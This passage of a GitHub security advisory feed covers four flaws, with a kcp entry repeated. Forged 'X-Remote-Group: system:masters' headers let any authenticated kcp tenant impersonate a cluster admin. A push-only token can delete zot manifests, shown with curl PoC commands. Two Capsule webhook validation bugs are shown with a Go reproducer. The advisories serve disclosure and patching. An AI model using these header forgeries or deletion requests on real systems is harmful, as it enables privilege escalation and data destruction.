-<li><a href="https://github.com/stacklok/toolhive-studio/commit/968182d7f3ee1e55123369e66ad88f82128119b0">https://github.com/stacklok/toolhive-studio/commit/968182d7f3ee1e55123369e66ad88f82128119b0</a></li>
-<li><a href="https://github.com/stacklok/toolhive/commit/d8f40cb1599b8bf66657f2dfff15bfbfc236e712">https://github.com/stacklok/toolhive/commit/d8f40cb1599b8bf66657f2dfff15bfbfc236e712</a></li>
-<li><a href="https://github.com/stacklok/toolhive-studio/releases/tag/v0.38.0">https://github.com/stacklok/toolhive-studio/releases/tag/v0.38.0</a></li>
-<li><a href="https://github.com/stacklok/toolhive/releases/tag/v0.30.1">https://github.com/stacklok/toolhive/releases/tag/v0.30.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-qg2g-g9w3-m5h8">https://github.com/advisories/GHSA-qg2g-g9w3-m5h8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qg2g-g9w3-m5h8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-18T17:16:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kcp-dev/kcp] kcp front-proxy does not strip inbound X-Remote-* identity headers, allowing any authenticated client to inject groups/warrants and impersonate system:masters in any workspace]]></title>
-        <id>https://github.com/advisories/GHSA-c8w2-fgvx-vhv4</id>
-        <link href="https://github.com/advisories/GHSA-c8w2-fgvx-vhv4"/>
-        <updated>2026-09-18T17:15:53.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
-<p>The kcp front-proxy fails to strip client-supplied identity headers before forwarding requests to shards. Any authenticated tenant can inject their own <code>X-Remote-Group</code> and <code>X-Remote-Extra-*</code> headers, which the shard trusts as a verified identity assertion — allowing a low-privilege user to escalate to cluster administrator (<code>system:masters</code>) and read, write, or delete resources in any workspace on the shard. This is a complete multi-tenant isolation and authorization bypass.</p>
-<h2 id="impact">Impact</h2>
-<p>In a sharded kcp deployment, external clients reach shards through the front-proxy, which authenticates the client and then forwards the resulting identity to the shard using Kubernetes request-header authentication (<code>X-Remote-User</code> / <code>X-Remote-Group</code> / <code>X-Remote-Extra-*</code>). The shard trusts these headers because they arrive over the front-proxy's mutually-authenticated connection.</p>
-<p>Because the front-proxy appended its identity headers instead of replacing them — and never removed any copies the client sent — an authenticated attacker could smuggle forged identity headers through to the shard. With this, an attacker holding any ordinary credential (client certificate, OIDC token, or service-account token) and no special privileges could:</p>
-<ul>
-<li>assert <code>X-Remote-Group: system:masters</code> and act as cluster super-user, bypassing the entire kcp authorizer chain in every workspace on the shard;</li>
-<li>forge <code>authorization.kcp.io/warrant</code> to assume an arbitrary user/group identity via kcp's delegated-identity mechanism;</li>
-<li>forge <code>authentication.kcp.io/scopes</code> to escape the cluster-scoping that confines service-account and impersonated identities to their origin workspace;</li>
-<li>satisfy per-workspace required-group gating by injecting the required group.</li>
-</ul>
-<p>The result is arbitrary read/write/delete access to any tenant's resources, secrets, RBAC, APIExports/APIBindings, and LogicalClusters — a cross-workspace access break and authorizer bypass across the proxy's trust boundary.</p>
-<h1 id="patches">Patches</h1>
-<p>Fixed in v0.31.4, 0.32.2. The front-proxy and the shard's in-process local-proxy now unconditionally remove any inbound <code>X-Remote-*</code> identity headers before stamping the authenticated identity, so no client-supplied value can be forwarded to a shard.</p>
-<p>Operators should upgrade to a patched release. No configuration changes are required after upgrading.</p>
-<h1 id="workarounds">Workarounds</h1>
-<p>There is no complete workaround other than upgrading. Deployments that terminate client connections at an external proxy capable of stripping <code>X-Remote-User</code>, <code>X-Remote-Group</code>, and all <code>X-Remote-Extra-*</code> headers from inbound requests before they reach the kcp front-proxy can mitigate exposure in the interim.</p>
-<p>Credit to <a href="https://github.com/5ud0er">5ud0er</a> / Tarmo Technologies.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kcp-dev/kcp/security/advisories/GHSA-c8w2-fgvx-vhv4">https://github.com/kcp-dev/kcp/security/advisories/GHSA-c8w2-fgvx-vhv4</a></li>
-<li><a href="https://github.com/kcp-dev/kcp/commit/7437cdcfec8f927d1a9bf1b2dd1e075d038e27ca">https://github.com/kcp-dev/kcp/commit/7437cdcfec8f927d1a9bf1b2dd1e075d038e27ca</a></li>
-<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.31.4">https://github.com/kcp-dev/kcp/releases/tag/v0.31.4</a></li>
-<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.32.2">https://github.com/kcp-dev/kcp/releases/tag/v0.32.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8w2-fgvx-vhv4">https://github.com/advisories/GHSA-c8w2-fgvx-vhv4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8w2-fgvx-vhv4</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-18T17:15:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kcp-dev/kcp] kcp front-proxy does not strip inbound X-Remote-* identity headers, allowing any authenticated client to inject groups/warrants and impersonate system:masters in any workspace]]></title>
-        <id>https://github.com/advisories/GHSA-c8w2-fgvx-vhv4</id>
-        <link href="https://github.com/advisories/GHSA-c8w2-fgvx-vhv4"/>
-        <updated>2026-09-18T17:15:53.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
-<p>The kcp front-proxy fails to strip client-supplied identity headers before forwarding requests to shards. Any authenticated tenant can inject their own <code>X-Remote-Group</code> and <code>X-Remote-Extra-*</code> headers, which the shard trusts as a verified identity assertion — allowing a low-privilege user to escalate to cluster administrator (<code>system:masters</code>) and read, write, or delete resources in any workspace on the shard. This is a complete multi-tenant isolation and authorization bypass.</p>
-<h2 id="impact">Impact</h2>
-<p>In a sharded kcp deployment, external clients reach shards through the front-proxy, which authenticates the client and then forwards the resulting identity to the shard using Kubernetes request-header authentication (<code>X-Remote-User</code> / <code>X-Remote-Group</code> / <code>X-Remote-Extra-*</code>). The shard trusts these headers because they arrive over the front-proxy's mutually-authenticated connection.</p>
-<p>Because the front-proxy appended its identity headers instead of replacing them — and never removed any copies the client sent — an authenticated attacker could smuggle forged identity headers through to the shard. With this, an attacker holding any ordinary credential (client certificate, OIDC token, or service-account token) and no special privileges could:</p>
-<ul>
-<li>assert <code>X-Remote-Group: system:masters</code> and act as cluster super-user, bypassing the entire kcp authorizer chain in every workspace on the shard;</li>
-<li>forge <code>authorization.kcp.io/warrant</code> to assume an arbitrary user/group identity via kcp's delegated-identity mechanism;</li>
-<li>forge <code>authentication.kcp.io/scopes</code> to escape the cluster-scoping that confines service-account and impersonated identities to their origin workspace;</li>
-<li>satisfy per-workspace required-group gating by injecting the required group.</li>
-</ul>
-<p>The result is arbitrary read/write/delete access to any tenant's resources, secrets, RBAC, APIExports/APIBindings, and LogicalClusters — a cross-workspace access break and authorizer bypass across the proxy's trust boundary.</p>
-<h1 id="patches">Patches</h1>
-<p>Fixed in v0.31.4, 0.32.2. The front-proxy and the shard's in-process local-proxy now unconditionally remove any inbound <code>X-Remote-*</code> identity headers before stamping the authenticated identity, so no client-supplied value can be forwarded to a shard.</p>
-<p>Operators should upgrade to a patched release. No configuration changes are required after upgrading.</p>
-<h1 id="workarounds">Workarounds</h1>
-<p>There is no complete workaround other than upgrading. Deployments that terminate client connections at an external proxy capable of stripping <code>X-Remote-User</code>, <code>X-Remote-Group</code>, and all <code>X-Remote-Extra-*</code> headers from inbound requests before they reach the kcp front-proxy can mitigate exposure in the interim.</p>
-<p>Credit to <a href="https://github.com/5ud0er">5ud0er</a> / Tarmo Technologies.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kcp-dev/kcp/security/advisories/GHSA-c8w2-fgvx-vhv4">https://github.com/kcp-dev/kcp/security/advisories/GHSA-c8w2-fgvx-vhv4</a></li>
-<li><a href="https://github.com/kcp-dev/kcp/commit/7437cdcfec8f927d1a9bf1b2dd1e075d038e27ca">https://github.com/kcp-dev/kcp/commit/7437cdcfec8f927d1a9bf1b2dd1e075d038e27ca</a></li>
-<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.31.4">https://github.com/kcp-dev/kcp/releases/tag/v0.31.4</a></li>
-<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.32.2">https://github.com/kcp-dev/kcp/releases/tag/v0.32.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8w2-fgvx-vhv4">https://github.com/advisories/GHSA-c8w2-fgvx-vhv4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8w2-fgvx-vhv4</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-18T17:15:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[zotregistry.dev/zot/v2] zot: Bearer authentication maps DELETE to push scope, allowing unauthorized deletion]]></title>
-        <id>https://github.com/advisories/GHSA-qg67-7m6v-qg25</id>
-        <link href="https://github.com/advisories/GHSA-qg67-7m6v-qg25"/>
-        <updated>2026-09-18T17:15:23.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A bearer token with only <code>pull</code> and <code>push</code> scopes can successfully delete manifests and blobs from a zot registry. The bearer authentication handler maps all non-GET/HEAD HTTP methods, including DELETE, to the <code>"push"</code> action, and the <code>DistSpecAuthzHandler</code> middleware is bypassed entirely for bearer-authenticated requests. This allows any client holding a push-only bearer token to delete arbitrary manifests and blobs within the token's repository scope, in violation of the <a href="https://distribution.github.io/distribution/spec/auth/scope/">Docker Distribution Token Authentication Specification</a>.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability exists in two interacting components:</p>
-<p><strong>1. Action Mapping Collapse (<code>pkg/api/authn.go:571–586</code>)</strong></p>
-<p>The bearer authentication handler maps HTTP methods to token scope actions using a binary check:</p>
-<pre><code class="language-go">action := "pull"
-if m := request.Method; m != http.MethodGet &amp;&amp; m != http.MethodHead {
-    action = "push"
-}
-</code></pre>
-<p>This collapses DELETE, PUT, PATCH, and POST into a single <code>"push"</code> action. The <code>"delete"</code> action is never assigned.</p>
-<p><strong>2. Authorization Bypass for Bearer Auth (<code>pkg/api/authz.go:270–275, 318–323</code>)</strong></p>
-<p>When a request is authenticated via bearer token, the <code>DistSpecAuthzHandler</code> middleware, which performs fine-grained action inference (distinguishing <code>create</code>, <code>read</code>, <code>update</code>, and <code>delete</code>) is bypassed entirely:</p>
-<pre><code class="language-go">if err != nil || (authnMwCtx != nil &amp;&amp; authnMwCtx.AuthnType == BEARER) {
-    next.ServeHTTP(response, request)
-    return
-}
-</code></pre>
-<p><strong>3. No Handler-Level Authorization Check</strong></p>
-<p>Neither <code>DeleteManifest</code> (<code>routes.go:799–884</code>) nor <code>DeleteBlob</code> (<code>routes.go:1192–1241</code>) performs an independent authorization check for delete permission before executing the deletion.</p>
-<p><strong>Deviation from Specification and Reference Implementation</strong></p>
-<p>The <a href="https://distribution.github.io/distribution/spec/auth/scope/"></a><a href="https://distribution.github.io/distribution/spec/auth/scope/">Docker Distribution Token Scope Documentation</a> defines <code>delete</code> as a distinct action separate from <code>push</code>. The reference implementation (<a href="https://github.com/distribution/distribution/blob/main/registry/handlers/app.go"></a><a href="https://github.com/distribution/distribution/blob/main/registry/handlers/app.go">distribution/distribution</a>) correctly maps DELETE requests to the <code>"delete"</code> action:</p>
-<pre><code class="language-go">case http.MethodDelete:
-    records = append(records,
-        auth.Access{
-            Resource: resource,
-            Action:   "delete",
-        })
-</code></pre>
-<p>Furthermore, zot's own native access-control configuration explicitly distinguishes <code>delete</code> as a separate permission from <code>create</code> and <code>update</code>, confirming the project's intent that delete is a distinct authorization action.</p>
-<p><strong>Suggested Fix</strong></p>
-<p>In <code>pkg/api/authn.go</code>, the action mapping should distinguish DELETE:</p>
-<pre><code class="language-go">action := "pull"
-switch {
-case m == http.MethodGet || m == http.MethodHead:
-    action = "pull"
-case m == http.MethodDelete:
-    action = "delete"
-default:
-    action = "push"
-}
-</code></pre>
-<p>The <code>DistSpecAuthzHandler</code> bypass for bearer-authenticated requests (<code>authz.go:270–275</code>) should also be reconsidered to ensure bearer-authenticated requests receive equivalently granular authorization checks.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Prerequisites:</strong> zot v2.1.15 with bearer authentication enabled, and a token server issuing JWTs with <code>actions: ["pull", "push"]</code> (no <code>"delete"</code>).</p>
-<p><strong>Steps to Reproduce:</strong></p>
-<ol>
-<li>Configure zot with bearer authentication pointing to a token server</li>
-<li>Obtain a bearer token with scope <code>repository:poc-test:pull,push</code> (no delete)</li>
-<li>Upload a config blob:</li>
-</ol>
-<pre><code class="language-bash">curl -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/octet-stream" \
-  -X POST "http://127.0.0.1:5001/v2/poc-test/blobs/uploads/?digest=sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a" \
-  -d '{}'
-# → 201 Created
-</code></pre>
-<ol start="4">
-<li>Push a manifest tagged <code>v1.0</code> (succeeds token has push):</li>
-</ol>
-<pre><code class="language-bash">curl -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/vnd.oci.image.manifest.v1+json" \
-  -X PUT "http://127.0.0.1:5001/v2/poc-test/manifests/v1.0" \
-  -d '{"schemaVersion":2,"mediaType":"application/vnd.oci.image.manifest.v1+json","config":{"mediaType":"application/vnd.oci.image.config.v1+json","digest":"sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","size":2},"layers":[]}'
-# → 201 Created
-</code></pre>
-<ol start="5">
-<li>DELETE the manifest with the same push-only token (<strong>should return 401, but returns 202</strong>):</li>
-</ol>
-<pre><code class="language-bash">curl -H "Authorization: Bearer $TOKEN" \
-  -X DELETE "http://127.0.0.1:5001/v2/poc-test/manifests/v1.0"
-# → 202 Accepted (VULNERABLE)
-</code></pre>
-<ol start="6">
-<li>Confirm the manifest is gone:</li>
-</ol>
-<pre><code class="language-bash">curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" \
-  "http://127.0.0.1:5001/v2/poc-test/manifests/v1.0"
-# → 404 Not Found
-</code></pre>
-<p><strong>Expected behavior:</strong> Step 5 should return <code>401 Unauthorized</code> with a <code>WWW-Authenticate</code> header requesting <code>scope="repository:poc-test:delete"</code>.</p>
-<p><strong>Actual behavior:</strong> Step 5 returns <code>202 Accepted</code> and the manifest is permanently deleted.</p>
-<p>A complete reproducer (minimal Go token server + zot config + automated script) is available upon request.</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Privilege Escalation / Unauthorized Deletion</strong> Any bearer token with push scope can delete manifests and blobs, even when the token was explicitly issued without delete permissions.</p>
-<p>This is particularly impactful in CI/CD environments where automated systems are issued least-privilege tokens with only pull and push permissions. A compromised or stolen CI token which should only be able to build and push images can be used to:</p>
-<ul>
-<li>Delete arbitrary manifests (tags) within any repository covered by the token's scope</li>
-<li>Delete arbitrary blobs within those repositories</li>
-<li>Render production container images unpullable</li>
-<li>Rewrite image history by removing specific tags</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/project-zot/zot/security/advisories/GHSA-qg67-7m6v-qg25">https://github.com/project-zot/zot/security/advisories/GHSA-qg67-7m6v-qg25</a></li>
-<li><a href="https://github.com/project-zot/zot/pull/4161">https://github.com/project-zot/zot/pull/4161</a></li>
-<li><a href="https://github.com/project-zot/zot/commit/7bb211bcd4352b90f3e99752607fbd1f050bf7ca">https://github.com/project-zot/zot/commit/7bb211bcd4352b90f3e99752607fbd1f050bf7ca</a></li>
-<li><a href="https://github.com/project-zot/zot/releases/tag/v2.1.18">https://github.com/project-zot/zot/releases/tag/v2.1.18</a></li>
-<li><a href="https://github.com/advisories/GHSA-qg67-7m6v-qg25">https://github.com/advisories/GHSA-qg67-7m6v-qg25</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qg67-7m6v-qg25</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-18T17:15:19.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/projectcapsule/capsule] Capsule: hostnameRegexHandler.OnUpdate validates stale (old) Tenant regex, allowing invalid AllowedHostnames regex to bypass webhook validation]]></title>
-        <id>https://github.com/advisories/GHSA-f94q-w3w8-cj67</id>
-        <link href="https://github.com/advisories/GHSA-f94q-w3w8-cj67"/>
-        <updated>2026-09-18T17:14:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A parameter order bug in <code>internal/webhook/tenant/validation/hostname_regex.go</code> causes the <code>hostnameRegexHandler.OnUpdate</code> webhook to validate the <strong>old</strong> Tenant object's <code>AllowedHostnames.Regex</code> instead of the <strong>new</strong> one being submitted. This allows an invalid (malformed) regex to bypass admission validation and be persisted to etcd, causing a Denial of Service for all Ingress operations within the affected tenant.</p>
-<h3 id="details">Details</h3>
-<p>The <code>TypedHandler[T]</code> interface defines <code>OnUpdate</code> as:</p>
-<pre><code class="language-go">// handlers.go
-OnUpdate(c client.Client, reader client.Reader, obj T, old T, decoder admission.Decoder, recorder events.EventRecorder) Func
-//                                               ^^^ NEW  ^^^ OLD
-</code></pre>
-<p>The dispatcher in <code>handler.go:93</code> calls:</p>
-<pre><code class="language-go">hndl.OnUpdate(c, reader, tnt, old, decoder, recorder)
-//                        ^^^ NEW  ^^^ OLD
-</code></pre>
-<p>However, <code>hostnameRegexHandler.OnUpdate</code> in <code>hostname_regex.go</code> declares its parameters in <strong>reversed order</strong>:</p>
-<pre><code class="language-go">// hostname_regex.go (BUGGY)
-func (h *hostnameRegexHandler) OnUpdate(
-    _ client.Client,
-    _ client.Reader,
-    old *capsulev1beta2.Tenant,   // ← receives NEW tenant (mislabeled as old)
-    tnt *capsulev1beta2.Tenant,   // ← receives OLD tenant (mislabeled as tnt)
-    ...
-) handlers.Func {
-    return func(...) *admission.Response {
-        if err := h.validate(tnt, req); err != nil { // ← validates OLD, not NEW
-            return err
-        }
-        return nil
-    }
-}
-</code></pre>
-<p>All 11 other handlers in the same package declare <code>(tnt, old)</code> correctly. <code>hostname_regex.go</code> is the only one with the swap.</p>
-<p>As a result, when a Cluster Admin updates <code>Tenant.Spec.IngressOptions.AllowedHostnames.Regex</code> to a malformed value, the webhook compiles the <strong>previous valid regex</strong> and returns <code>Allow</code>. The malformed regex is then written to etcd.</p>
-<p>Subsequently, every Ingress <code>CREATE</code> or <code>UPDATE</code> in that tenant triggers <code>validate_hostnames.go:160</code>:</p>
-<pre><code class="language-go">matched, _ = regexp.MatchString(allowedRegex, currentHostname)
-</code></pre>
-<p><code>regexp.MatchString</code> with an invalid pattern returns <code>(false, error)</code>. The error is silently ignored, <code>matched</code> is <code>false</code>, and <strong>every hostname is rejected</strong> — blocking all Ingress operations in the tenant until the Tenant object is manually corrected by an admin.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>//go:build ignore
-// Standalone reproducer for hostname_regex.go argument swap bug in Capsule
-// No external deps - shows the bug logic using only stdlib
-
-package main
-
-import (
-    "fmt"
-    "regexp"
-)
-
-// Simulating the Tenant spec structure
-type AllowedHostnames struct {
-    Regex string
-}
-
-type IngressOptions struct {
-    AllowedHostnames *AllowedHostnames
-}
-
-type TenantSpec struct {
-    IngressOptions IngressOptions
-}
-
-type Tenant struct {
-    Name string
-    Spec TenantSpec
-}
-
-// =========================================================
-// BUGGY implementation (hostname_regex.go as-is)
-// OnUpdate(_, _, old *Tenant, tnt *Tenant) → validates OLD
-// =========================================================
-func hostnameValidate(tnt *Tenant) error {
-    if tnt.Spec.IngressOptions.AllowedHostnames == nil {
-        return nil
-    }
-    if len(tnt.Spec.IngressOptions.AllowedHostnames.Regex) == 0 {
-        return nil
-    }
-    _, err := regexp.Compile(tnt.Spec.IngressOptions.AllowedHostnames.Regex)
-    if err != nil {
-        return fmt.Errorf("Deny: unable to compile allowedHostnames allowedRegex")
-    }
-    return nil
-}
-
-// Dispatcher calls: OnUpdate(c, reader, newTenant, oldTenant, ...)
-// Interface says:   OnUpdate(c, reader, obj[NEW], old[OLD], ...)
-//
-// BUGGY handler receives: (old, tnt) meaning:
-//   3rd param (labeled "old") = actually NEW
-//   4th param (labeled "tnt") = actually OLD
-// Then calls h.validate(tnt) = validates the OLD tenant
-func buggyOnUpdate(newTenant, oldTenant *Tenant) error {
-    // BUG: parameters are SWAPPED vs the interface contract
-    old := newTenant // dispatcher's "new" arrives as "old" in this function
-    tnt := oldTenant // dispatcher's "old" arrives as "tnt" in this function
-    _ = old          // unused in the real code too
-    return hostnameValidate(tnt) // validates OLD, not NEW
-}
-
-// CORRECT implementation (what it should be)
-func correctOnUpdate(newTenant, oldTenant *Tenant) error {
-    _ = oldTenant
-    return hostnameValidate(newTenant) // validates NEW
-}
-
-// Simulate ingress hostname validation AFTER bad regex is stored
-func validateIngressHostname(tenant *Tenant, hostname string) bool {
-    if tenant.Spec.IngressOptions.AllowedHostnames == nil {
-        return true
-    }
-    allowedRegex := tenant.Spec.IngressOptions.AllowedHostnames.Regex
-    if len(allowedRegex) == 0 {
-        return true
-    }
-    // This is validate_hostnames.go:160 - error is IGNORED
-    matched, _ := regexp.MatchString(allowedRegex, hostname)
-    return matched
-}
-
-func main() {
-    fmt.Println("=== Capsule Bug Reproducer: hostname_regex.go argument swap ===")
-    fmt.Println()
-
-    oldTenant := &amp;Tenant{
-        Name: "demo-tenant",
-        Spec: TenantSpec{
-            IngressOptions: IngressOptions{
-                AllowedHostnames: &amp;AllowedHostnames{
-                    Regex: `^[\w.-]+\.example\.com$`, // valid regex
-                },
-            },
-        },
-    }
-
-    // Attacker (cluster admin) sets an INVALID regex in the new spec
-    newTenant := &amp;Tenant{
-        Name: "demo-tenant",
-        Spec: TenantSpec{
-            IngressOptions: IngressOptions{
-                AllowedHostnames: &amp;AllowedHostnames{
-                    Regex: `[invalid-regex(`, // INVALID regex
-                },
-            },
-        },
-    }
-
-    fmt.Printf("Old tenant regex: %q (valid)\n", oldTenant.Spec.IngressOptions.AllowedHostnames.Regex)
-    fmt.Printf("New tenant regex: %q (INVALID)\n", newTenant.Spec.IngressOptions.AllowedHostnames.Regex)
-    fmt.Println()
-
-    // Step 1: Webhook runs OnUpdate
-    fmt.Println("--- Step 1: Webhook OnUpdate ---")
-
-    err := buggyOnUpdate(newTenant, oldTenant)
-    if err != nil {
-        fmt.Printf("[BUGGY]   Webhook DENIES update: %v\n", err)
-    } else {
-        fmt.Println("[BUGGY]   Webhook ALLOWS update (validates OLD regex) ← WRONG")
-    }
-
-    err = correctOnUpdate(newTenant, oldTenant)
-    if err != nil {
-        fmt.Printf("[CORRECT] Webhook DENIES update: %v ← EXPECTED\n", err)
-    } else {
-        fmt.Println("[CORRECT] Webhook ALLOWS update")
-    }
-
-    // Step 2: Invalid regex now stored in etcd - simulate ingress validation
-    fmt.Println()
-    fmt.Println("--- Step 2: Ingress creation after bad regex stored ---")
-    storedTenant := newTenant // bad regex is now in etcd
-
-    hostnames := []string{
-        "app.example.com",
-        "api.example.com",
-        "evil.attacker.com",
-    }
-
-    for _, h := range hostnames {
-        allowed := validateIngressHostname(storedTenant, h)
-        fmt.Printf("  Ingress hostname %q → allowed=%v", h, allowed)
-        if !allowed {
-            fmt.Print("  ← BLOCKED (DoS: invalid regex causes all hostnames to fail)")
-        }
-        fmt.Println()
-    }
-
-    fmt.Println()
-    fmt.Println("=== Result ===")
-    fmt.Println("Invalid regex bypasses webhook validation and gets stored.")
-    fmt.Println("All subsequent Ingress create/update in this tenant are BLOCKED.")
-    fmt.Println("CWE-697: Incorrect Comparison — wrong Tenant object is validated.")
-}
-</code></pre>
-<pre><code class="language-go">// Simulates the buggy webhook behaviour
-oldTenant := &amp;Tenant{AllowedRegex: `^[\w-]+\.example\.com$`} // valid
-newTenant := &amp;Tenant{AllowedRegex: `[invalid-regex(`}         // malformed
-
-// Buggy OnUpdate: validates oldTenant (valid) → ALLOW
-// Correct OnUpdate: validates newTenant (invalid) → DENY
-
-// After malformed regex is stored, all ingress hostnames are rejected:
-matched, _ := regexp.MatchString(`[invalid-regex(`, "app.example.com")
-// matched = false, error ignored → Ingress blocked
-</code></pre>
-<h3 id="fix">Fix</h3>
-<p>Swap the parameter names in <code>hostname_regex.go</code> to match the interface contract:</p>
-<pre><code class="language-go">// BEFORE (buggy)
-func (h *hostnameRegexHandler) OnUpdate(
-    _ client.Client,
-    _ client.Reader,
-    old *capsulev1beta2.Tenant,
-    tnt *capsulev1beta2.Tenant,
-    ...
-
-// AFTER (fixed)
-func (h *hostnameRegexHandler) OnUpdate(
-    _ client.Client,
-    _ client.Reader,
-    tnt *capsulev1beta2.Tenant,
-    old *capsulev1beta2.Tenant,
-    ...
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>A Cluster Admin (or a compromised admin account) can — intentionally or via a typo — set a malformed <code>AllowedHostnames.Regex</code> on any Tenant. The webhook silently accepts the update. All users in the affected tenant are subsequently unable to create or update any Ingress resource until an admin manually corrects the Tenant spec. This constitutes a targeted Denial of Service against the tenant's ingress layer.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/projectcapsule/capsule/security/advisories/GHSA-f94q-w3w8-cj67">https://github.com/projectcapsule/capsule/security/advisories/GHSA-f94q-w3w8-cj67</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/pull/1983">https://github.com/projectcapsule/capsule/pull/1983</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/commit/8d89d6865df6f41c7faa22fc9e807a57b01bfd0e">https://github.com/projectcapsule/capsule/commit/8d89d6865df6f41c7faa22fc9e807a57b01bfd0e</a></li>
-<li><a href="https://github.com/projectcapsule/capsule/releases/tag/v0.13.7">https://github.com/projectcapsule/capsule/releases/tag/v0.13.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-f94q-w3w8-cj67">https://github.com/advisories/GHSA-f94q-w3w8-cj67</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f94q-w3w8-cj67</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-18T17:14:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/projectcapsule/capsule] Capsule: Tenant owner bypasses Capsule's forbidden namespace/service/node label and annotation enforcement]]></title>
-        <id>https://github.com/advisories/GHSA-gjw4-3v3v-rqxg</id>
-        <link href="https://github.com/advisories/GHSA-gjw4-3v3v-rqxg"/>
-        <updated>2026-09-18T17:14:32.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Capsule lets a cluster administrator forbid specific metadata keys that tenant owners must not place on their own resources: <code>Tenant.spec.namespaceOptions.forbiddenLabels</code> / <code>forbiddenAnnotations</code> (namespaces), <code>Tenant.spec.serviceOptions.forbiddenLabels</code> / <code>forbiddenAnnotations</code> (Services), and the cluster-wide forbidden worker-node labels/annotations. These lists are an isolation control — they exist to stop a tenant owner from setting metadata that other controllers or admission plugins key on (Pod Security Admission labels, <code>kubernetes.io/metadata.name</code>, LoadBalancer/externalIP service annotations, scheduler annotations, vendor labels that grant network reach, etc.). The validating webhooks enforce them through <code>api.ValidateForbidden</code>, which calls <code>ForbiddenListSpec.ExactMatch(key)</code> for every key the tenant submits.</p>
-<p><code>ExactMatch</code> is broken. It sorts the denied list <strong>case-insensitively</strong> (<code>sort.SliceStable</code> with a <code>strings.ToLower</code> comparator) and then performs a <strong>byte-order binary search</strong> (<code>sort.SearchStrings</code>) over the result. <code>sort.SearchStrings</code> is only correct on a slice sorted in plain byte-ascending order. Whenever the denied list contains an entry whose case-insensitive position differs from its byte position — which happens any time the list mixes a capitalised key with lowercase keys, because ASCII uppercase letters (0x41–0x5A) sort <em>before</em> lowercase (0x61–0x7A) by byte but are interleaved by <code>ToLower</code> — the binary search lands on the wrong index and <code>ExactMatch</code> returns <strong>false for a key that is literally present in the denied list</strong>. The webhook then <em>allows</em> the forbidden metadata.</p>
-<p>A tenant owner (who legitimately holds patch/create rights on their own tenant-owned namespaces and Services) can therefore set a metadata key the administrator explicitly forbade, defeating the control and reaching metadata-driven cross-tenant / system effects of exactly the kind Capsule's forbidden lists are meant to prevent. The bug is deterministic, requires no race, and is present unchanged on <code>main</code> HEAD.</p>
-<h2 id="affected-code-v0135">Affected code (v0.13.5)</h2>
-<p><code>pkg/api/forbidden_list.go</code> — the comparison primitive:</p>
-<pre><code class="language-go">func (in ForbiddenListSpec) ExactMatch(value string) (ok bool) {
-    if len(in.Exact) &gt; 0 {
-        sort.SliceStable(in.Exact, func(i, j int) bool {
-            return strings.ToLower(in.Exact[i]) &lt; strings.ToLower(in.Exact[j]) // case-INSENSITIVE order
-        })
-
-        i := sort.SearchStrings(in.Exact, value) // binary search assuming BYTE order
-
-        ok = i &lt; len(in.Exact) &amp;&amp; in.Exact[i] == value
-    }
-
-    return ok
-}
-</code></pre>
-<p><code>sort.SearchStrings</code> returns the smallest index <code>i</code> such that <code>in.Exact[i] &gt;= value</code> under raw byte comparison. If the slice is not byte-sorted, that index is wrong and the subsequent <code>in.Exact[i] == value</code> equality check fails even though <code>value</code> is in the slice — a false "not forbidden".</p>
